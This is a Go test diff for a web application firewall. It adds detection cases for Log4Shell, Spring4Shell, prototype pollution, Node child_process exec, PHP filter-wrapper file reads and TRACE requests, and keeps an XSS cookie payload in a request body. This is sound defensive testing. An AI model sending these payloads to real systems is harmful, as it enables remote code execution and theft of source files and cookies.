@@ -29,6 +29,23 @@ func TestCheckInline(t *testing.T) {
 			want: gateway.WAFInlineDetected, wantRule: 942100},
 		{name: "benign request", s: sample(http.MethodGet, "/api/orders?page=2&sort=created", nil, ""),
 			want: gateway.WAFInlineClean},
+		// Families amendment 21 added to the in-path set; block rules passed
+		// all of these before.
+		{name: "Log4Shell in User-Agent", s: withUA(sample(http.MethodGet, "/", nil, ""), "${jndi:ldap://203.0.113.7/a}"),
+			want: gateway.WAFInlineDetected, wantRule: 944150},
+		{name: "Spring4Shell class loader", s: sample(http.MethodGet, "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x", nil, ""),
+			want: gateway.WAFInlineDetected, wantRule: 944130},
+		{name: "prototype pollution", s: sample(http.MethodGet, "/?__proto__[admin]=1", nil, ""),
+			want: gateway.WAFInlineDetected, wantRule: 934130},
+		{name: "Node.js child_process", s: sample(http.MethodGet, "/?x=require('child_process').exec('id')", nil, ""),
+			want: gateway.WAFInlineDetected, wantRule: 934100},
+		{name: "PHP filter wrapper", s: sample(http.MethodGet, "/?f=php://filter/convert.base64-encode/resource=index.php", nil, ""),
+			want: gateway.WAFInlineDetected, wantRule: 933140},
+		{name: "TRACE method", s: sample(http.MethodTrace, "/", nil, ""),
+			want: gateway.WAFInlineDetected, wantRule: 911100},
+		// The platform policy applies in-path too: REST methods are allowed.
+		{name: "DELETE is allowed", s: sample(http.MethodDelete, "/api/orders/7", nil, ""),
+			want: gateway.WAFInlineClean},
 		// Bodies are never checked in-path, even when the sample carries one.
 		{name: "attack only in body", s: sample(http.MethodPost, "/api/comments", nil, `{"text":"<script>alert(document.cookie)</script>"}`),
 			want: gateway.WAFInlineClean},
@@ -262,5 +279,21 @@ func TestBoundHeaders(t *testing.T) {
 	utf := http.Header{"X-Name": {strings.Repeat("é", api.EdgeWAFMaxInspectHeaderValueBytes)}}
 	if v := boundHeaders(utf).Get("X-Name"); !utf8.ValidString(v) {
 		t.Fatal("a cut value is not valid UTF-8")
+	}
+}
+
+// TestBoundURI: a sampled check scores at most api.EdgeWAFMaxInspectURIBytes
+// of the URI, so its cost stays bounded (ADR-831 amendment 21).
+func TestBoundURI(t *testing.T) {
+	if got := boundURI("/a?b=c"); got != "/a?b=c" {
+		t.Fatalf("a short URI changed: %q", got)
+	}
+	long := "/q?x=" + strings.Repeat("é", api.EdgeWAFMaxInspectURIBytes)
+	got := boundURI(long)
+	if len(got) > api.EdgeWAFMaxInspectURIBytes || len(got) < api.EdgeWAFMaxInspectURIBytes-4 {
+		t.Fatalf("scored %d URI bytes, want close to but at most %d", len(got), api.EdgeWAFMaxInspectURIBytes)
+	}
+	if !utf8.ValidString(got) {
+		t.Fatal("a cut URI is not valid UTF-8")
 	}
 }
